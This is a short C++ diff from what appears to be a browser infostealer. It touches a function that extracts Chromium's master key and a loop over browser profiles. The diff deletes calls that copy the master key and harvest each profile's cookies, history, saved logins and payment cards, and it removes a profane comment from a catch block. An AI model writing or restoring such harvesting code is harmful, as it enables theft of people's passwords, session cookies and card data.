@@ -126,7 +126,8 @@ std::string getMasterKey(std::string path) {
         else {
             return "";
         }
-    } catch (...) { // idgafffffff
+    } catch (...) 
+    {
         return "";
     } 
 }
@@ -602,11 +603,6 @@ void browsers::Chromium()
                     std::string dir = global::defaultPath + global::names[i];
                     int result = _mkdir(dir.c_str());
 
-                    CopyMasterKey(browsersPaths[i], i);
-                    GetCookies (browsersPaths[i], profiles[j], i);
-                    GetHistory(browsersPaths[i], profiles[j], i);
-                    GetLogins(browsersPaths[i], profiles[j], i);
-                    GetCards(browsersPaths[i], profiles[j], i);
                 }
             }
         }
